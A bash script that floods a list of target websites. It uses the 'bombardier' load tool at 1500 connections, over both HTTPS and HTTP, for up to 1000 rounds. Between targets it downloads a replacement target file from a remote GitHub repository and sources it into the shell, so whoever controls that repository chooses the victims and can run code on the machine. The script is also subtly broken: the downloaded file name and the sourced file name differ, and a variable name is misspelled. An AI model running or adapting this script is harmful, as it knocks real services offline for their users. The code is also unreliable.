#!/bin/bash

. ./victimlist.sh

list=("${victimlist[@]}")

for n in {1..1000}; do 
    for (( i = 0; i < ${#list[@]}; i++ )) 
        do
        
        # DDoS
        echo "Fucking - ${list[i]}"
        ./bombardier -c 1500 -d 60s -l https://${list[i]} --http1
        echo "Switching to http"
        sleep 2
        ./bombardier -c 1500 -d 60s -l http://${list[i]} --http1
        echo "Fucked - ${list[i]}"
        sleep 2
        
        # Fetch and load new fucklist into memory
        echo "Fetching new victim list..."
        curl -LJO  https://raw.githubusercontent.com/v1adko/fuckputin/master/fucklist.sh
        sleep 1
        . ./victimlist.sh

        #  If it's different from the current list - restart the queue
        if [ "${list[0]}" != "${victimist[0]}" ]; then
            echo "Fetched new fucklist, restarting..."
            list=("${victimlist[@]}")
            i=-1
        fi
    done
done
